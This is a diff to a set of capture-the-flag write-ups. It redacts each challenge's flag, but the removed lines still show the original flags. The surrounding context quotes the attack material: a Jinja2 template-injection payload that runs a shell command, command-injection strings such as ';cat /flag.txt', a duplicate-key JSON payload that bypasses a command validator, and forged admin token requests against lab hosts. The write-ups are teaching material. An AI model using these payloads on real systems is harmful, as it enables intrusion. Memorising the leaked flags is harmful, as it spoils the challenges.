@@ -177,7 +177,7 @@ A gift for you: 0x7ffee8f0dd70
 [*] Sending commands...
 [*] Response:
 http://ezynotes.hc/7eJCltBtvtvuid=0(root) gid=0(root) groups=0(root)
-hackingclub{fake_flag}
+hackingclub{REDACTED}
 ➜  eezypwn git:(main) ✗ python3 exploit.py REMOTE 10.10.0.20:9000
 [*] Target: 10.10.0.20:9000
 [*] Received: ========Welcome to EzyNotes========
@@ -187,7 +187,7 @@ A gift for you: 0x7ffef0c63370
 [*] Sending commands...
 [*] Response:
 http://ezynotes.hc/R8bMy1E8bmauid=0(root) gid=0(root) groups=0(root)
-hackingclub{ezypwn_buff3r_0v3rfl0w_v4n1ll4}%             
+hackingclub{REDACTED}%             
 ```
 
 ---
@@ -248,10 +248,10 @@ curl -s http://10.10.0.21:8080/api/login --json '{"email":"railoca@railoca.com",
 {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InJhaWxvY2EiLCJlbWFpbCI6InJhaWxvY2FAcmFpbG9jYS5jb20iLCJpc19hZG1pbiI6dHJ1ZSwiZXhwIjoxNzcxNTE2MzQyLCJpYXQiOjE3NzE0Mjk5NDJ9.rx5hfIFWoxwI1Z2Hko7jAmR3QyKMhyh1bN0kzvlDm7I"}
 
 curl -s http://10.10.0.21:8080/api/admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InJhaWxvY2EiLCJlbWFpbCI6InJhaWxvY2FAcmFpbG9jYS5jb20iLCJpc19hZG1pbiI6dHJ1ZSwiZXhwIjoxNzcxNTE2MzQyLCJpYXQiOjE3NzE0Mjk5NDJ9.rx5hfIFWoxwI1Z2Hko7jAmR3QyKMhyh1bN0kzvlDm7I'
-{"flag":"hackingclub{1gn0r3d_d035n7_m34n_1gn0r3d}"}
+{"flag":"hackingclub{REDACTED}"}
 ```
 
-**Flag:** `hackingclub{1gn0r3d_d035n7_m34n_1gn0r3d}`
+**Flag:** `hackingclub{REDACTED}`
 
 ---
 
@@ -353,12 +353,12 @@ CarnaVown git:(main) ✗ python3 initware/decrypt_flag.py
 AES Key Hex: bd18def1e763f1f082a676ceaaadf814
 XOR Key Hex: 645218113b9e3a81f24468f26b7ab685
 File Content (Base64+): zDxjEUgub9lCLI2euKbN6MhtvF+QNMlvLPRR10zGxCFCTfPyOI7f03rrn4f84yr+Je+aRKvSH5VQ+UNtt6h7cw==
-Decrypted Flag: hackingclub{r3v3rs1ng_t0_d3c0d3_1nl1t_r4ns0mw4r3_ftw}
+Decrypted Flag: hackingclub{REDACTED}
 
 Decrypted important.txt: This file is important :)
 ```
 
-**Flag:** `hackingclub{r3v3rs1ng_t0_d3c0d3_1nl1t_r4ns0mw4r3_ftw}`
+**Flag:** `hackingclub{REDACTED}`
 
 ---
 
@@ -416,13 +416,13 @@ We send a JSON payload with duplicate keys: `command` (lowercase) and `Command` 
 Invalid or missing command
 
 ➜  InstanceMetrics git:(main) ✗ curl -s 172.16.13.215/api/instance-metrics/ -H 'Content-Type: application/json' -d '{"command":"cat /flag.txt","Command":"whoami"}'
-{"output":"hackingclub{p4rs3r_d1ff3r3nt14ls_br34k_tru5t}\n"}%  
+{"output":"hackingclub{REDACTED}\n"}%  
 ```
 
 1.  **Go** sees `Command` ("df"), validates it as safe, and forwards the packet.
 2.  **Node.js** extracts `command` ("cat /flag.txt") and executes it.
 
-**Flag:** `hackingclub{p4rs3r_d1ff3r3nt14ls_br34k_tru5t}`
+**Flag:** `hackingclub{REDACTED}`
 
 ---
 
@@ -491,10 +491,10 @@ ETag: W/"42-QKK1dnjJfrrzQyh04RoEdRBuv6o"
 {"sucess":true,"msg":"login sucessful","lastLogin":"202602181608"}
 
 ➜  pinned git:(main) ✗ curl 172.16.9.243/api/admin/flag -H 'Authorization: Bearer 202602181608'
-{"sucess":true,"flag":"hackingclub{byp4ss_runnt4m3_1s_f4n}"}
+{"sucess":true,"flag":"hackingclub{REDACTED}"}
 ```
 
-**Flag:** `hackingclub{byp4ss_runnt4m3_1s_f4n}`
+**Flag:** `hackingclub{REDACTED}`
 
 ---
 
@@ -579,10 +579,10 @@ curl -s http://172.16.13.204/admin -H "Authorization: Bearer $token"
     <description>&lt;response>&lt;isAdmin>true&lt;/isAdmin>&lt;/response></description>
     <updatedAt>Wed Feb 18 2026 16:14:46 GMT+0000 (Coordinated Universal Time)</updatedAt>
     <createdAt>Wed Feb 18 2026 16:14:46 GMT+0000 (Coordinated Universal Time)</createdAt>
-</response>{"flag":"hackingclub{p4rs1ng_c0nfus10n_1s_fun}","message":"Welcome to the admin panel","user":{"id":"","username":"","email":"","description":"","isAdmin":true}}
+</response>{"flag":"hackingclub{REDACTED}","message":"Welcome to the admin panel","user":{"id":"","username":"","email":"","description":"","isAdmin":true}}
 ```
 
-**Flag:** `hackingclub{p4rs1ng_c0nfus10n_1s_fun}`
+**Flag:** `hackingclub{REDACTED}`
 
 ---
 
@@ -613,7 +613,7 @@ We can change the password of any user (including the admin, typically `user_id=
 
 ![alt text](image-3.png)
 
-**Flag:** `hackingclub{b0l4_t0_acC0uNt_T4k3_0v3R}`
+**Flag:** `hackingclub{REDACTED}`
 
 
 ---
@@ -645,7 +645,7 @@ We can send a simple `SSTI` payload to read the `/flag.txt` file
 
 **Payload:** `{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}{% endraw %}` 
 
-**Flag:** `hackingclub{S3rV3r_S1d3_T3mpl4t3_1nj3ct10n_j1nj42}`
+**Flag:** `hackingclub{REDACTED}`
 
 ---
 
@@ -676,4 +676,4 @@ By sending the payload `;id` we can confirm a command injection
 
 **Payload:** `;cat /flag.txt`
 
-**Flag:** `hackingclub{L3g4cy_C0mm4nd_Inj3ct10n_FTW}`
+**Flag:** `hackingclub{REDACTED}`
